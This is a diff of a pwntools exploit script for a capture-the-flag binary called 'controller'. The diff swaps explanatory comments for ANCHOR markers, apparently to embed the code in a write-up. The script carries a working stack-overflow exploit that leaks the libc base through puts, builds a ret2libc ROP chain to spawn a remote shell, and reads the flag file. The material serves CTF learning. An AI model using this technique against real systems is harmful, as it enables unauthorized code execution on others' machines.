@@ -1,23 +1,14 @@
 from pwn import *
 
-# The challenge gives us a file named `controller` and the libc used.
-# So we tell pwntools to load them.
+# ANCHOR: loading
 elf = ELF("controller")
 elf_rop = ROP(elf)
 libc = ELF("libc.so.6")
+# ANCHOR_END: loading
 
 conn = remote(MACHINE_IP, MACHINE_PORT)
 
-# We need to find a vulnerability, so first thing we do is disassemble the
-# `controller` executable and search for any weird code.
-# Inside the `calculator` function we can find the usage of a scanf using the
-# "%s" formatter to some address on the stack. This means that we can write as
-# much data as we want, this allows us to rewrite the stack frames to execute
-# the functions we want.
-
-# To access the overflow we need to find an operation that gives `65338`, for
-# this we will do `-32669 * -2`, we navigate the menus until we are asked for
-# the payload.
+# ANCHOR: fn_prepare_overflow
 def prepare_overflow():
     conn.recvuntil("Insert the amount of 2 different types of recources: ")
 
@@ -28,14 +19,13 @@ def prepare_overflow():
     # Choose to do a multiplication
     conn.sendline("3")
     conn.recvuntil("> ")
+# ANCHOR_END: fn_prepare_overflow
 
-# The scanf starts at [rbp - 0x28] so we need to fill the start of the payload
-# with 0x28 garbage bytes.
+# ANCHOR: offset_overflow
 offset_overflow = b"A" * (0x28)
+# ANCHOR_END: offset_overflow
 
-# The first thing we need to do is to retrieve to libc base address. This allows
-# us to return to any function on the libc (ret2libc). This means that we can
-# return to a function such as `system` and execute a shell.
+# ANCHOR: fn_retrieve_libc_base
 def retrieve_libc_base():
     with log.progress("retrieving libc base") as progress:
         # The payload will consists of the beginning garbage bytes then we will
@@ -70,9 +60,9 @@ def retrieve_libc_base():
         leak = conn.recvline().strip()
         leak = u64(leak.ljust(8, b"\x00"))
         libc.address = leak - libc.symbols["puts"]
+# ANCHOR_END: fn_retrieve_libc_base
 
-# Now that we know the libc base address, we need to open a shell to be able to
-# print the flag.
+# ANCHOR: fn_retrieve_shell
 def retrieve_shell():
     with log.progress("retrieving a shell") as progress:
         # This time the rop will consist of a similar thing, loading the address
@@ -97,10 +87,11 @@ def retrieve_shell():
         progress.status("sending overflow")
         conn.sendline(rop)
         conn.recvline()
+# ANCHOR_END: fn_retrieve_shell
 
+# ANCHOR: cat_flag
 retrieve_libc_base()
 retrieve_shell()
-
-# Now we're in a shell, final step is to cat the flag!
 conn.sendline("cat flag.txt")
 log.success(conn.recvlineS())
+# ANCHOR_END: cat_flag
